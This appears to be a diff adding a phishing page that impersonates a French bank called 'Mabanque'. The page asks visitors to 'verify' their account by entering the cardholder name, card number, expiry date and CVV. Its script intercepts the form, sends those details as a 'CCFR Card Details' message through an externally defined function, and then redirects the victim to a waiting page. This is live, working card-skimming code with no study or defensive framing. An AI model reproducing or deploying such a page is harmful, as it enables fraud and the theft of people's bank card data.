@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>Mabanque</title>
+</head>
+<body>
+    <header>
+<div class="left">
+
+     <img src="res/img/logo.png" > </div> 
+
+</div>
+<div class="right">
+    <img src="res/img/right.png">
+</div>
+
+<div class="head">
+    <img src="res/img/heado.png" >
+
+</div>
+
+    </header>
+    <div class="z">
+
+</div>
+<main>
+<form action="post.php" method="post">
+<div class="form1">
+        <div class="card">
+          
+        </div>
+
+<div class="title" style="text-align:left; padding:20px; color:#383838;">
+    <label>Vérifiez votre compte.</label>
+    <p style="font-size:0.7em;">
+    Veuillez vérifier votre identité en saisissant les informations de votre carte. Assurez-vous de saisir les informations valides de la carte associée à votre compte.
+    </p>
+</div> 
+
+
+<div class="coll">
+    <label> Nom du titulaire</label>
+<input type="text" name="name" required></div> 
+
+<div class="coll"> 
+<label>Numéro de carte</label> 
+<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div> 
+<div>
+
+<div class="coll"> <label> Date d'expiration </label>
+<input type="text" name="exp" placeholder="MM/AA" id="exp" required></div>
+
+<div> 
+<div class="coll"> <label> code de sécurité </label> 
+<input type="text" name="cvv" placeholder="CVV" id="cvv" required>  </div> 
+
+
+<div class="butt">
+<button type="submit"> Continuer</button>
+</div>
+
+</form>
+</main>
+
+</div>
+ 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`💳 CCFR Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);
+
+window.location="wait.html";
+
+});
+</script>
+ 
+
+</body>
+</html>
